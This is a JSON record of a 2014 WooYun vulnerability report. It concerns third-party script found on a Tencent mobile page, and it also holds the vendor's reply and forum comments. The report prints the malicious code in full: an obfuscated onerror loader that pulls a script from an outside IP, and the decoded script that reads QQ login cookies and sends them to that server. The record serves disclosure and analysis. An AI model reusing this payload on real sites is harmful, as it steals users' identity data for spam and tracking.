{"id": 3309, "wybug_id": "wooyun-2014-060265", "wybug_title": "腾讯某手机网页页面暴露用户QQ信息跨域采集", "wybug_corp": "腾讯", "wybug_author": "vace", "wybug_date": "2014-05-12 14:04", "wybug_open_date": "2014-06-26 14:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向公众公开  简要描述： 这个手机网页中含有腾讯以外的加密js脚本运行,后台发送cookies中的用户QQ信息.访问某网站的时候,利用iframe跨域造成用户已经使用浏览器登录(空间,邮箱.微博....)的信息泄露,导致用户频繁收到网站发来的推销邮件和推销消息. 详细说明：  这个手机网页中含有腾讯以外的加密js脚本运行,后台发送cookies中的用户QQ信息.访问某网站的时候,利用iframe跨域造成用户已经登录的信息泄露,导致用户频繁收到网站发来的推销邮件和推销消息.\n\n估计存在这样漏洞还有很多.在某A网站中,利用js生成iframe页面\n\n在这个iframe页面中会得到用户信息发送到指定服务器   漏洞证明：  这个手机网页中含有腾讯以外的加密js脚本运行,后台发送cookies中的用户QQ信息.访问某网站的时候,利用iframe跨域造成用户已经登录的信息泄露,导致用户频繁收到网站发来的推销邮件和推销消息.\n\n估计存在这样漏洞还有很多.在某A网站中,利用js生成iframe页面\n\n在这个iframe页面中存在这样的代码\n<div style=\"display:none;\"><img src=\"http://42.120.11.238:8888/z\" onerror=\"/*_Ka*/var/*hCnn*/IHse/*Wav*/=/*fBJAp*/\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067./*lsxIcC*/\\u0066\\u0072\\u006f\\u006d\\u0043\\u0068\\u0061\\u0072\\u0043\\u006f\\u0064\\u0065;/*ksHMx*/var/*KuVkYP*/NWVbw_QY/*_ztkzYy*/=/*_pNZE*/\\u0065\\u0076\\u0061\\u006c;NWVbw_QY(IHse(118,97,114,32,111,72,101,97,100,61,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,72,69,65,68,39,41,46,105,116,101,109,40,48,41,59,118,97,114,32,111,83,99,114,105,112,116,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,111,83,99,114,105,112,116,46,116,121,112,101,61,34,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,34,59,111,83,99,114,105,112,116,46,115,114,99,61,34,104,116,116,112,58,47,47,52,50,46,49,50,48,46,49,49,46,50,51,56,58,56,56,56,56,47,49,46,106,115,34,59,111,72,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,111,83,99,114,105,112,116,41,59));\"/></div>\n加密js,使用js_encode解密得到\nvar uin=G(\"pt2gguin\")||G(\"o_cookie\")||G(\"p_uin\")||G(\"uin\");uin=uin.replace(/^[o|0]*/ig,\"\");function G(name){var arr,reg=new RegExp(\"(^| )\"+name+\"=([^;]*)(;|$)\");if(arr=document.cookie.match(reg))return unescape(arr[2]);else return null};function Request(argname){var url=document.location.href;var arrStr=url.substring(url.indexOf(\"?\")+1).split(\"&\");for(var i=0;i<arrStr.length;i++){var loc=arrStr[i].indexOf(argname+\"=\");if(loc!=-1){return arrStr[i].replace(argname+\"=\",\"\").replace(\"?\",\"\");break}};return\"\"};function Q(uin){var uid=Request('uid');var ref=Request('ref');var furl=Request('furl');var title=Request('title');var url=\"http://42.120.11.238:8888/?action=saveQQ&uincookie=\";url+=\"&qq=\"+uin;url+=\"&uid=\"+uid;url+=\"&referrer=\"+ref;url+=\"&url=\"+furl;url+=\"&title=\"+title;url+=\"&r=\"+(new Date()).getTime();var oHead=document.getElementsByTagName('HEAD').item(0);var oScript=document.createElement(\"script\");oScript.type=\"text/javascript\";oScript.src=url;oHead.appendChild(oScript)};if(!isNaN(uin)){Q(uin)}\n   修复方案：  删除植入代码.检查其他页面是.   版权声明：转载请注明来源 vace@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-12 16:11 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-12 17:57 |    \t\t落叶 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | xxxx)\t\t \n  很快被封杀了吗    \n     2014-05-13 11:29 |    \t\trichard chen \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 无证程序猿，做WEB前端开发，也对后台略懂...)\t\t \n  秒封的感觉啊    \n     2014-05-13 18:26 |    \t\t天星 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 本来无一物，何处惹尘埃)\t\t \n  - - 确定已经封了。。。 已经不好使了。。。。我恨vace    \n     2014-05-14 11:51 |    \t\t光的传人 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:22        | IT爱好者~)\t\t \n  我想提交这个漏洞来，被人抢先了~    \n     2014-05-26 23:40 |    \t\t神倦懒言 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 从事php开发以及服务器的运维工作，还是菜...)\t\t \n  RANK15?为什么你总rank是4？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}